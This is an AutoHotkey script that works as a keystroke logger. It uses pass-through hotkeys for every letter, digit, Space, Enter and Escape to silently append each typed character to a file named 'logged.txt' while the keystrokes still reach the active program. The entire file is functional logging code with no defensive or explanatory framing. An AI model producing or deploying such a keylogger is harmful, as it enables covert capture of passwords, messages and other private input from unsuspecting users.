;############################## - Performance
#NoEnv
#MaxHotkeysPerInterval 99000000
#HotkeyInterval 99000000
#MaxThreadsPerHotkey 255
#KeyHistory 0
ListLines Off
Process, Priority, , A
SetBatchLines, -1
SetKeyDelay, 0, -1
SetMouseDelay, -1
SetDefaultMouseSpeed, 0
SetWinDelay, -1
SetWorkingDir %A_ScriptDir%
SendMode Input
;############################## - Filepath
filePath := "logged.txt"
;############################## - Uppercase
+~A::
	FileAppend, A, %filePath%
return

+~B::
	FileAppend, B, %filePath%
return

+~C::
	FileAppend, C, %filePath%
return

+~D::
	FileAppend, D, %filePath%
return

+~E::
	FileAppend, E, %filePath%
return

+~F::
	FileAppend, F, %filePath%
return

+~G::
	FileAppend, G, %filePath%
return

+~H::
	FileAppend, H, %filePath%
return

+~I::
	FileAppend, I, %filePath%
return

+~J::
	FileAppend, J, %filePath%
return

+~K::
	FileAppend, K, %filePath%
return

+~L::
	FileAppend, L, %filePath%
return

+~M::
	FileAppend, M, %filePath%
return

+~N::
	FileAppend, N, %filePath%
return

+~O::
	FileAppend, O, %filePath%
return

+~P::
	FileAppend, P, %filePath%
return

+~Q::
	FileAppend, Q, %filePath%
return

+~R::
	FileAppend, R, %filePath%
return

+~S::
	FileAppend, S, %filePath%
return

+~T::
	FileAppend, T, %filePath%
return

+~U::
	FileAppend, U, %filePath%
return

+~V::
	FileAppend, V, %filePath%
return

+~W::
	FileAppend, W, %filePath%
return

+~X::
	FileAppend, X, %filePath%
return

+~Y::
	FileAppend, Y, %filePath%
return

+~Z::
	FileAppend, Z, %filePath%
return

;################################################# - Lowercase

~A::
	FileAppend, a, %filePath%
return

~B::
	FileAppend, b, %filePath%
return

~C::
	FileAppend, c, %filePath%
return

~D::
	FileAppend, d, %filePath%
return

~E::
	FileAppend, e, %filePath%
return

~F::
	FileAppend, f, %filePath%
return

~G::
	FileAppend, g, %filePath%
return

~H::
	FileAppend, h, %filePath%
return

~I::
	FileAppend, i, %filePath%
return

~J::
	FileAppend, j, %filePath%
return

~K::
	FileAppend, k, %filePath%
return

~L::
	FileAppend, l, %filePath%
return

~M::
	FileAppend, m, %filePath%
return

~N::
	FileAppend, n, %filePath%
return

~O::
	FileAppend, o, %filePath%
return

~P::
	FileAppend, p, %filePath%
return

~Q::
	FileAppend, q, %filePath%
return

~R::
	FileAppend, r, %filePath%
return

~S::
	FileAppend, s, %filePath%
return

~T::
	FileAppend, t, %filePath%
return

~U::
	FileAppend, u, %filePath%
return

~V::
	FileAppend, v, %filePath%
return

~W::
	FileAppend, w, %filePath%
return

~X::
	FileAppend, x, %filePath%
return

~Y::
	FileAppend, y, %filePath%
return

~Z::
	FileAppend, z, %filePath%
return
;############################## - Numbers
~0::
	FileAppend, 0, %filePath%
return

~1::
	FileAppend, 1, %filePath%
return

~2::
	FileAppend, 2, %filePath%
return

~3::
	FileAppend, 3, %filePath%
return

~4::
	FileAppend, 4, %filePath%
return

~5::
	FileAppend, 5, %filePath%
return

~6::
	FileAppend, 6, %filePath%
return

~7::
	FileAppend, 7, %filePath%
return

~8::
	FileAppend, 8, %filePath%
return

~9::
	FileAppend, 9, %filePath%
return
;############################## - Special
~*Space::
	FileAppend, {Space}, %filePath%
return
 
~*Enter::
	FileAppend, {Enter}, %filePath%
return
 
~*Esc::
	FileAppend, {Escape}, %filePath%
return